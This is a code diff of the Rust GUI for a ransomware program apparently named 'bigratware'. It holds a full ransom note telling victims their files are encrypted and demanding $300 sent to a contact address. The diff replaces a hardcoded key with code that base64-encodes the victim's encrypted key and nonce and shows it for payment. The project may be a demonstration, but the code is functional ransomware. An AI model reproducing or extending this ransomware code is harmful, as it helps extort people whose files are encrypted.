@@ -2,9 +2,11 @@ extern crate native_windows_gui as nwg;
 extern crate native_windows_derive as nwd;
 
 use anyhow::{Context, Result};
+use base64::Engine;
 use nwd::NwgUi;
 use nwg::{Font, NativeUi};
 use indoc::indoc;
+use crate::decryptor::StatusData;
 
 const BIGRAT_SIDEBAR: &[u8; 576138] = include_bytes!("sidebar.bmp");
 const SIDEBAR_WIDTH: i32 = 240;
@@ -40,14 +42,12 @@ pub struct Decryptor {
     #[nwg_control(
         text: indoc! {"
             ## What happened to my computer?\r
-            \r
             Your important files are encrypted.\r
             Many of your documents, photos, videos, databases and other files are no longer accessible because they \
             have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. \
             Nobody can recover your files without our decryption service.\r
             \r
             ## Can I recover my files?\r
-            \r
             Sure. We guarantee that you can recover all your files safely and easily.\r
             Scroll down and at the bottom you'll see a bunch of seemingly senseless letters and numbers. This is an \
             encrypted key, that you need to copy and send to the attached email address together with $300 worth of \
@@ -61,21 +61,6 @@ pub struct Decryptor {
             ## Encrypted key\r
             Send it to bigratware@example.com\r
             \r
-            tPfP8wWCB9uygyfP4hUPi/1eC6vOoqYP65b1fkiyqQTg8l\r
-            LyG157F2YbKj5jM5qUaJYBIHuNnETR+SLe9/rKJJHzzIIi\r
-            e+wAEQcV9yJaMM85+nxGl61MHCkaLxDWkAy5p3gWqrv747\r
-            dLl330zR2Y9iKqsXKq57+lMeZ0ZnhJU3b17HdYjtxxkIaF\r
-            wUvsvQrfTvGpgTYoyFo6BOTCH7yXGyC/8btR/Y35WJ+Jx9\r
-            8q81eyamrStzBlOPD60u5dBLrhZXnc8IAljW3knqEkAcB2\r
-            nQQ092Gfn6d14ofoRo3bTq/ehF2zJiKmJWHOAi9FxRtz7N\r
-            IN5Nk4byGyVHRHGfTg6HLDqaKjGNtWdJnEWVxRoaguFsfc\r
-            AiZNmRENYBPOw3vtC6VJBYRBgo2P03AN4yB36GPc/sqHMq\r
-            GscnL47UO20Pge6w8uRzmykzDSmSqKB4tUk2V/2XhlpMZi\r
-            qQDBjhh5PDb6v9h21hantrmjixJ5Aax2ETi1jTEZKdn2N8\r
-            02YiL9Uroa4f8ui34bQHuXinTFURR/+I8F+xR/F6YPubQV\r
-            Q/SEvevMTcc6iIJ9eRZO5FKgdds4iaWE1f6fOhkBOgEZuc\r
-            D2SeNPyigXro4sL7dw0T8WTdynb54unaJWq2J9Qw3I+rHd\r
-            SIsQ0uv5dUcvfqrNjl054MxJxIHeZTuAQ3Tn97M=
         "},
         position: (CONTENT_H_START, 40),
         size: (MAX_CONTENT_WIDTH, 480),
@@ -103,15 +88,19 @@ impl Decryptor {
 }
 
 
-pub fn start_decryptor_gui() -> Result<()> {
+pub fn start_decryptor_gui(status_data: StatusData) -> Result<()> {
     nwg::init().with_context(|| "Failed to init Native Windows GUI")?;
 
     if let Err(e) = Font::set_global_family("Segoe UI") {
         eprintln!("Failed to set the global font: {e}");
     }
 
-    let _app = Decryptor::build_ui(Default::default())
+    let window = Decryptor::build_ui(Default::default())
         .with_context(|| "Failed to build UI")?;
+
+    let pair_b64 = base64::engine::general_purpose::STANDARD_NO_PAD
+        .encode([status_data.encrypted_key, status_data.encrypted_nonce].concat());
+    window.info_box.set_text(&(window.info_box.text() + &pair_b64));
 
     nwg::dispatch_thread_events();
 
